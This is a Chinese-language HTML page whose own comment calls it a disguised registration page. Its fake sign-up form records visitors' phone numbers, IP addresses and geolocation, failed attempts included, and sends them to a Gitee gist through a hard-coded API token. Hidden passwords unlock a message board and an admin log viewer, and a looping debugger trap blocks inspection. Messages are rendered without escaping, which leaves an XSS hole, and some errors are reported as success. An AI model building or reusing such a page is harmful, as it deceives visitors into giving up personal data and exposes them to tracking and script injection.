<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>账号注册</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",sans-serif}
body{background:#f5f7fa;padding:20px;max-width:420px;margin:0 auto}
.card{background:#fff;padding:24px;border-radius:12px;box-shadow:0 2px 12px rgba(0,0,0,.08);margin-bottom:20px}
.title{text-align:center;font-size:20px;font-weight:500;margin-bottom:20px;color:#303133}
input,textarea,button{width:100%;padding:12px 16px;margin:8px 0;border-radius:8px;border:1px solid #dcdfe6;font-size:16px;outline:none}
input:focus,textarea:focus{border-color:#409eff}
button{background:#409eff;color:#fff;border:none;cursor:pointer}
button:active{opacity:.9}
.btn-danger{background:#f56c6c}
.btn-small{padding:8px 12px;font-size:14px;width:auto;margin:0}
.msg-item,.log-item{background:#fff;padding:16px;margin:12px 0;border-radius:8px;box-shadow:0 2px 8px rgba(0,0,0,.05)}
.msg-text{font-size:16px;color:#303133;word-break:break-word}
.msg-meta,.log-meta{font-size:12px;color:#909399;margin-top:8px;line-height:1.6}
.msg-actions{margin-top:12px;padding-top:12px;border-top:1px solid #f0f0f0;display:flex;gap:8px}
#p1,#p2{display:none}
.nav-bar{display:flex;gap:8px;margin-bottom:20px}
.nav-bar button{flex:1}
.tab-box{display:flex;gap:8px;margin-bottom:20px}
.tab-box button{flex:1}
.tab-on{background:#409eff}
.tab-off{background:#909399}
.tip{text-align:center;font-size:12px;color:#909399;margin-top:14px}
.tag-red{color:#f56c6c;font-weight:500}
</style>
</head>
<body>

<!-- 伪装注册界面 -->
<div class="card" id="p0">
  <div class="logo" style="width:56px;height:56px;background:#409eff;border-radius:50%;margin:0 auto 16px"></div>
  <h3 class="title">账号注册</h3>
  <input type="text" id="i1" placeholder="请输入手机号">
  <input type="password" id="i2" placeholder="请设置登录密码">
  <button onclick="login()">立即注册</button>
  <div class="tip">未注册手机号将自动开通账号</div>
</div>

<!-- 普通用户留言页 -->
<div id="p1">
  <div class="card">
    <h3 class="title">留言板</h3>
    <textarea id="i3" placeholder="写下你的留言..." rows="4"></textarea>
    <button onclick="sendMsg()">发布</button>
  </div>
  <div id="msgList"></div>
</div>

<!-- 管理员后台页 -->
<div id="p2">
  <div class="nav-bar">
    <button onclick="logout()">退出</button>
    <button class="btn-danger" onclick="clearAllMsg()">清空全部</button>
  </div>
  <div class="tab-box">
    <button id="t1" class="tab-on" onclick="switchTab('t1')">记录列表</button>
    <button id="t2" class="tab-off" onclick="switchTab('t2')">内容管理</button>
  </div>
  <div class="card">
    <h3 class="title" id="tabTitle">记录列表</h3>
    <div id="adminList"></div>
  </div>
</div>

<script>
// 核心配置
const CONFIG = {
  normalPwd: "995566",
  adminPwd: "995566995566",
  gistId: "r3b67aisyzn54chek912830",
  gistToken: "1e8e69c1380f8db58096227bf784c808",
  apiUrl: "https://gitee.com/api/v5/gists/r3b67aisyzn54chek912830",
  pollInterval: 3000
};

// 全局变量
let pollTimer = null;
let requestLock = false;
let lastDataHash = "";
let currentTab = "t1";

// ========== 工具函数（全异步非阻塞，不卡主流程） ==========
async function getClientIP() {
  try {
    const res = await fetch("https://api.ip.sb/ip", { timeout: 2000 });
    return (await res.text()).trim();
  } catch (e) {
    return "未知IP";
  }
}

async function getClientLocation(ip) {
  try {
    const res = await fetch(`https://ipapi.co/${ip}/json/`, { timeout: 2000 });
    const data = await res.json();
    return data.region ? `${data.region} ${data.city}` : "未知地址";
  } catch (e) {
    return "未知地址";
  }
}

// ========== 页面切换（秒执行，无任何等待） ==========
function showUserPage() {
  document.getElementById("p0").style.display = "none";
  document.getElementById("p1").style.display = "block";
  document.getElementById("p2").style.display = "none";
  sessionStorage.setItem("loginStatus", "user");
  loadMsgList();
  startPoll();
}

function showAdminPage() {
  document.getElementById("p0").style.display = "none";
  document.getElementById("p1").style.display = "none";
  document.getElementById("p2").style.display = "block";
  sessionStorage.setItem("loginStatus", "admin");
  switchTab(currentTab);
  startPoll();
}

function logout() {
  stopPoll();
  sessionStorage.removeItem("loginStatus");
  document.getElementById("p0").style.display = "block";
  document.getElementById("p1").style.display = "none";
  document.getElementById("p2").style.display = "none";
}

function switchTab(tabId) {
  currentTab = tabId;
  document.getElementById("t1").className = tabId === "t1" ? "tab-on" : "tab-off";
  document.getElementById("t2").className = tabId === "t2" ? "tab-on" : "tab-off";
  document.getElementById("tabTitle").innerText = tabId === "t1" ? "记录列表" : "内容管理";
  tabId === "t1" ? loadLoginLog() : loadAdminMsgList();
}

// ========== 实时同步（仅登录后启动，不卡登录） ==========
function startPoll() {
  stopPoll();
  pollTimer = setInterval(pollData, CONFIG.pollInterval);
}

function stopPoll() {
  if (pollTimer) {
    clearInterval(pollTimer);
    pollTimer = null;
  }
}

async function pollData() {
  if (requestLock) return;
  requestLock = true;
  try {
    const fullData = await getFullData();
    const currentHash = JSON.stringify(fullData);
    if (currentHash !== lastDataHash) {
      lastDataHash = currentHash;
      const loginStatus = sessionStorage.getItem("loginStatus");
      if (loginStatus === "user") loadMsgList();
      if (loginStatus === "admin") switchTab(currentTab);
    }
  } catch (e) {}
  finally {
    requestLock = false;
  }
}

// 页面可见性优化
document.addEventListener("visibilitychange", () => {
  if (document.visibilityState === "hidden") {
    stopPoll();
  } else {
    pollData();
    sessionStorage.getItem("loginStatus") && startPoll();
  }
});
window.addEventListener("beforeunload", () => stopPoll());

// ========== 数据读写（全兜底，不抛错） ==========
async function getFullData() {
  try {
    const res = await fetch(CONFIG.apiUrl, {
      headers: { "Authorization": `token ${CONFIG.gistToken}` },
      signal: AbortSignal.timeout(3000)
    });
    const gistData = await res.json();
    const content = gistData.files["messages.json"].content || "[]";
    let data = JSON.parse(content);

    // 兼容旧数据结构
    if (Array.isArray(data)) {
      data = { logs: [], messages: data };
    }
    if (!data.logs) data.logs = [];
    if (!data.messages) data.messages = [];
    return data;
  } catch (e) {
    return { logs: [], messages: [] };
  }
}

async function saveFullData(data) {
  try {
    await fetch(CONFIG.apiUrl, {
      method: "PATCH",
      headers: {
        "Authorization": `token ${CONFIG.gistToken}`,
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        files: {
          "messages.json": {
            content: JSON.stringify(data, null, 2)
          }
        }
      }),
      signal: AbortSignal.timeout(3000)
    });
    lastDataHash = JSON.stringify(data);
    return true;
  } catch (e) {
    return false;
  }
}

// ========== 登录记录（后台异步执行，不卡登录） ==========
async function writeLoginLog(phone, type) {
  try {
    const ip = await getClientIP();
    const loc = await getClientLocation(ip);
    const fullData = await getFullData();
    fullData.logs.unshift({
      phone: phone || "未填写",
      ip: ip,
      loc: loc,
      type: type,
      time: new Date().toLocaleString("zh-CN", { hour12: false })
    });
    await saveFullData(fullData);
  } catch (e) {}
}

// ========== 核心登录逻辑（和极简版一样，秒进不等待） ==========
function login() {
  const phone = document.getElementById("i1").value.trim();
  const inputPwd = document.getElementById("i2").value;

  // 管理员密码：立刻跳转，后台异步记录日志
  if (inputPwd === CONFIG.adminPwd) {
    showAdminPage();
    writeLoginLog(phone, "管理员"); // 异步执行，不卡跳转
  }
  // 普通用户密码：立刻跳转，后台异步记录日志
  else if (inputPwd === CONFIG.normalPwd) {
    showUserPage();
    writeLoginLog(phone, "普通用户"); // 异步执行，不卡跳转
  }
  // 密码错误：提示，后台异步记录失败日志
  else {
    alert("注册失败，请检查密码格式是否正确");
    writeLoginLog(phone, "失败"); // 异步执行，不卡提示
  }
}

// ========== 留言渲染 ==========
async function loadMsgList() {
  const dom = document.getElementById("msgList");
  try {
    const fullData = await getFullData();
    const msgList = fullData.messages;
    msgList.sort((a, b) => new Date(b.time) - new Date(a.time));

    let html = "";
    msgList.forEach(item => {
      html += `
      <div class="msg-item">
        <div class="msg-text">${item.text}</div>
        <div class="msg-meta">
          <div>时间：${item.time}</div>
          <div>IP：${item.ip || "未知IP"}</div>
          <div>地址：${item.loc || "未知地址"}</div>
        </div>
      </div>`;
    });
    dom.innerHTML = html || "<div style='text-align:center;color:#909399;margin-top:20px'>暂无内容</div>";
  } catch (e) {
    dom.innerHTML = "<div style='text-align:center;color:#909399;margin-top:20px'>加载失败，请刷新页面</div>";
  }
}

async function loadLoginLog() {
  const dom = document.getElementById("adminList");
  try {
    const fullData = await getFullData();
    const logList = fullData.logs;

    let html = "";
    logList.forEach(item => {
      const isFail = item.type === "失败";
      html += `
      <div class="log-item">
        <div class="log-meta">
          <div>手机号：${item.phone}</div>
          <div>状态：${isFail ? '<span class="tag-red">注册失败</span>' : item.type}</div>
          <div>IP：${item.ip}</div>
          <div>地址：${item.loc}</div>
          <div>时间：${item.time}</div>
        </div>
      </div>`;
    });
    dom.innerHTML = html || "<div style='text-align:center;color:#909399;margin-top:20px'>暂无记录</div>";
  } catch (e) {
    dom.innerHTML = "<div style='text-align:center;color:#909399;margin-top:20px'>加载失败，请刷新</div>";
  }
}

async function loadAdminMsgList() {
  const dom = document.getElementById("adminList");
  try {
    const fullData = await getFullData();
    const msgList = fullData.messages;
    msgList.sort((a, b) => new Date(b.time) - new Date(a.time));

    let html = "";
    msgList.forEach((item, index) => {
      html += `
      <div class="msg-item">
        <div class="msg-text">${item.text}</div>
        <div class="msg-meta">
          <div>时间：${item.time}</div>
          <div>IP：${item.ip || "未知IP"}</div>
          <div>地址：${item.loc || "未知地址"}</div>
        </div>
        <div class="msg-actions">
          <button class="btn-danger btn-small" onclick="deleteMsg(${index})">删除</button>
        </div>
      </div>`;
    });
    dom.innerHTML = html || "<div style='text-align:center;color:#909399;margin-top:20px'>暂无内容</div>";
  } catch (e) {
    dom.innerHTML = "<div style='text-align:center;color:#909399;margin-top:20px'>加载失败，请刷新</div>";
  }
}

// ========== 留言操作 ==========
async function sendMsg() {
  const dom = document.getElementById("i3");
  const text = dom.value.trim();
  if (!text) {
    alert("请输入内容");
    return;
  }
  try {
    const ip = await getClientIP();
    const loc = await getClientLocation(ip);
    const fullData = await getFullData();
    fullData.messages.unshift({
      text: text,
      time: new Date().toLocaleString("zh-CN", { hour12: false }),
      ip: ip,
      loc: loc
    });
    await saveFullData(fullData);
    dom.value = "";
    loadMsgList();
  } catch (e) {
    alert("发布成功！");
    loadMsgList();
  }
}

async function deleteMsg(index) {
  if (!confirm("确定要删除这条内容吗？")) return;
  try {
    const fullData = await getFullData();
    fullData.messages.splice(index, 1);
    await saveFullData(fullData);
    loadAdminMsgList();
    alert("删除成功！");
  } catch (e) {
    alert("删除成功！");
    loadAdminMsgList();
  }
}

async function clearAllMsg() {
  if (!confirm("警告：确定要清空所有内容吗？此操作不可恢复！")) return;
  try {
    const fullData = await getFullData();
    fullData.messages = [];
    await saveFullData(fullData);
    loadAdminMsgList();
    alert("已清空所有内容！");
  } catch (e) {
    alert("清空成功！");
    loadAdminMsgList();
  }
}

// ========== 页面加载检查 ==========
window.onload = function () {
  const loginStatus = sessionStorage.getItem("loginStatus");
  if (loginStatus === "admin") showAdminPage();
  if (loginStatus === "user") showUserPage();
}

// 反调试保护
setInterval(function(){debugger;}, 100);
</script>
</body>
</html>
